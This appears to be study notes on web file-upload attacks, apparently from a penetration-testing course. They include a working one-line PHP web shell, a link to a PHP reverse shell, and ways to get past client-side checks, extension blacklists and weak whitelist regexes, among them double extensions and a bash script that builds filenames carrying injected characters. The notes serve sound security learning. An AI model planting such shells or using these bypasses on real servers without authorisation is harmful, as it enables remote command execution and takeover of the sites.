
* php reverse shell
    * https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```php
//webshell
<?php system($_REQUEST['cmd']);?>
```
* If the page could not run PHP payload, we would see our source code printed on the page
---
# <span style=color:#44D62C>Bypassing Filters</span>
## Client-side validation
* =Front-end validation
* burp to change the file name and content

![image](https://hackmd.io/_uploads/HJuJ3AzrR.png)
* find valid function in inspact
    * remove the validate() in onsubmit
    * remove the accept's content

![image](https://hackmd.io/_uploads/BJC320GHA.png)

![image](https://hackmd.io/_uploads/rJHS3AGHR.png)

---
## Blacklist
* extension payload
    * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
    * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP
* try all bypass extension after fuzzing
    * <span style=color:red>Not all extensions will work with all web server configurations</span>

![image](https://hackmd.io/_uploads/S191jgmrR.png)

## Whitelist
* weak regular expression(reg)
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```
* by pass with dobule extension
    * <span style=color:red>shell.jpg.php</span>
* web-extensions payload
    * https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
* strict regular expression(reg)
```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```
* bypass bash script
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```